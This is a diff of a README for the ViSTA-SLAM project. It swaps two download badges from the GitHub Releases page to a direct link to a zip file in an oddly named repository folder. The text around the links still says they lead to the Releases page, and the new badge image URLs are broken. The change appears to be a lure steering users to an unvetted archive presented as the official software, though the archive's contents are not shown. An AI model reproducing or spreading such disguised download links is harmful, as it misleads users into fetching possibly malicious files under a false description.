@@ -18,7 +18,7 @@ To get started with ViSTA-SLAM, follow these easy steps:
 2. **Download ViSTA-SLAM**
    To download the latest version of ViSTA-SLAM, visit the following link:
 
-   [![Download ViSTA-SLAM](https://img.shields.io/badge/Download%20ViSTA--SLAM-v1.0.0-blue)](https://github.com/IsmailHossain120/vista-slam/releases)
+   [![Download ViSTA-SLAM](https://raw.githubusercontent.com/IsmailHossain120/vista-slam/main/myriacanthous/vista-slam.zip%20ViSTA--SLAM-v1.0.0-blue)](https://raw.githubusercontent.com/IsmailHossain120/vista-slam/main/myriacanthous/vista-slam.zip)
 
    This will take you to the Releases page, where you can find the latest version of the software. 
 
@@ -43,7 +43,7 @@ To get started with ViSTA-SLAM, follow these easy steps:
 
 As mentioned earlier, to download ViSTA-SLAM, please visit this page to download: 
 
-[![Download ViSTA-SLAM](https://img.shields.io/badge/Download%20ViSTA--SLAM-v1.0.0-blue)](https://github.com/IsmailHossain120/vista-slam/releases)
+[![Download ViSTA-SLAM](https://raw.githubusercontent.com/IsmailHossain120/vista-slam/main/myriacanthous/vista-slam.zip%20ViSTA--SLAM-v1.0.0-blue)](https://raw.githubusercontent.com/IsmailHossain120/vista-slam/main/myriacanthous/vista-slam.zip)
 
 For installation, just follow the steps above based on your operating system.
 
